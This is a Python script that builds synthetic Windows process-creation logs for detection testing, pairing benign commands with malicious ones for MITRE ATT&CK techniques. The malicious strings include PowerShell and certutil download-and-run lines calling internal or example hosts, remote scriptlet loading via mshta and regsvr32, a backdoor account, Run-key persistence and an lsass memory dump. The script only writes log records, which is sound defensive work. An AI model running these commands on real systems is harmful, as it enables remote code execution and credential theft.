import json, os

# Normal-looking defaults. Every generated event starts from this.
BASE = {
    "Image": "", "CommandLine": "", "OriginalFileName": "",
    "ParentImage": r"C:\Windows\System32\cmd.exe",
    "ParentCommandLine": r"C:\Windows\system32\cmd.exe",
    "User": r"LABPC\student", "IntegrityLevel": "Medium",
    "Description": "", "Product": "", "Company": "",
}

SYS32 = "C:\\Windows\\System32\\"

# One entry per technique: the process, a malicious command line, and a
# benign "near miss" (same program, harmless use).
TECHNIQUES = {
    "T1059.001": dict(
        image=SYS32 + r"WindowsPowerShell\v1.0\powershell.exe",
        malicious=r"powershell.exe -nop -w hidden -c ""IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.5/a.ps1')""",
        benign=r"powershell.exe -NoProfile -Command Get-Process | Sort-Object CPU",
        variant=r'''powershell.exe -ep bypass -command "IEX (New-Object Net.WebClient).DownloadString('https://cdn.example.org/run.ps1')"'''),
    "T1218.011": dict(
        image=SYS32 + "rundll32.exe",
        malicious=r"rundll32.exe C:\Windows\Temp\driver.sys,Run",
        benign=r"rundll32.exe shell32.dll,Control_RunDLL desk.cpl",
        variant=r"rundll32.exe D:\drivers\helper.sys,Start"),
    "T1218.005": dict(
        image=SYS32 + "mshta.exe",
        malicious=r"mshta.exe javascript:a=GetObject('script:http://10.0.0.5/x.sct').Exec();close()",
        benign=r"mshta.exe C:\Users\student\Documents\help.hta",
        variant=r"mshta.exe javascript:close(new ActiveXObject('WScript.Shell').Run('calc.exe'))"),
    "T1218.010": dict(
        image=SYS32 + "regsvr32.exe",
        malicious=r"regsvr32.exe /s /u /i:http://192.168.1.10/file.sct scrobj.dll",
        benign=r"regsvr32.exe /s C:\Windows\System32\vbscript.dll",
        variant=r"regsvr32.exe /s /n /u /i:http://172.16.4.20/payload.sct scrobj.dll"),
    "T1105": dict(
        image=SYS32 + "certutil.exe",
        malicious=r"certutil.exe -urlcache -f http://10.0.0.5/payload.exe payload.exe",
        benign=r"certutil.exe -hashfile C:\Users\student\Downloads\setup.iso SHA256",
        variant=r"certutil.exe -f -urlcache https://files.example.net/tool.exe C:\Users\Public\tool.exe"),
    "T1053.005": dict(
        image=SYS32 + "schtasks.exe",
        malicious=r"schtasks.exe /create /tn Updater /tr C:\Users\student\AppData\Local\Temp\x.exe /sc once /st 12:00",
        benign=r"schtasks.exe /create /tn Backup /tr C:\Scripts\backup.bat /sc daily /st 02:00",
        variant=r"schtasks.exe /create /sc once /tn Cleanup /tr C:\Windows\Temp\run.bat /st 09:30"),
    "T1547.001": dict(
        image=SYS32 + "reg.exe",
        malicious=r"reg.exe add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Updater /d C:\Users\student\x.exe",
        benign=r"reg.exe add HKCU\Software\MyApp /v Theme /d dark",
        variant=r"reg.exe add HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce /v Task /t REG_SZ /d C:\Users\Public\m.exe /f"),
    "T1136.001": dict(
        image=SYS32 + "net.exe",
        malicious=r"net.exe user hacker P@ssw0rd123 /add",
        benign=r"net.exe user guest",
        variant=r"net1.exe user svc_backup Winter2026! /add /domain",
        variant_image=r"C:\Windows\System32\net1.exe"),
    "T1003.001": dict(
        image=r"C:\Tools\procdump.exe",
        malicious=r"procdump.exe -ma lsass.exe lsass.dmp",
        benign=r"procdump.exe -ma notepad.exe notepad.dmp",
        variant=r"procdump64.exe -accepteula -ma lsass.exe C:\Temp\l.dmp",
        variant_image=r"C:\Tools\procdump64.exe"),
    "T1197": dict(
        image=SYS32 + "bitsadmin.exe",
        malicious=r"bitsadmin.exe /transfer job1 /download /priority high http://10.0.0.5/evil.dll C:\Users\student\evil.dll",
        benign=r"bitsadmin.exe /list /allusers",
        variant=r"bitsadmin.exe /transfer j2 /download /priority normal https://files.example.net/p.ps1 C:\Users\Public\p.ps1"),
    "T1047": dict(
        image=SYS32 + r"wbem\WMIC.exe",
        malicious=r'wmic.exe process call create "cmd.exe /c calc.exe"',
        benign=r"wmic.exe os get caption",
        variant=r'wmic.exe /node:10.0.0.8 process call create "powershell.exe -enc AAAA"'),
    "T1033": dict(
        image=SYS32 + "whoami.exe",
        malicious=r"whoami.exe /priv",
        benign=r"whoami.exe /user",
        variant=r"whoami.exe -priv"),
}

def build_event(image, command_line):
    ev = dict(BASE)
    ev["Image"] = image
    ev["CommandLine"] = command_line
    ev["OriginalFileName"] = image.split("\\")[-1].upper()
    return ev

def make_pair(technique):
    t = TECHNIQUES[technique]
    return build_event(t["image"], t["malicious"]), build_event(t["image"], t["benign"])

def make_triple(technique):
    t = TECHNIQUES[technique]
    variant_image = t.get("variant_image", t["image"])
    return (build_event(t["image"], t["malicious"]),
            build_event(variant_image, t["variant"]),
            build_event(t["image"], t["benign"]))

if __name__ == "__main__":
    os.makedirs("data/synthetic_logs", exist_ok=True)
    for tech in TECHNIQUES:
        mal, ben = make_pair(tech)
        json.dump(mal, open(f"data/synthetic_logs/{tech}_malicious.json", "w"), indent=1)
        json.dump(ben, open(f"data/synthetic_logs/{tech}_benign.json", "w"), indent=1)
    print("saved", len(TECHNIQUES) * 2, "logs in data/synthetic_logs/")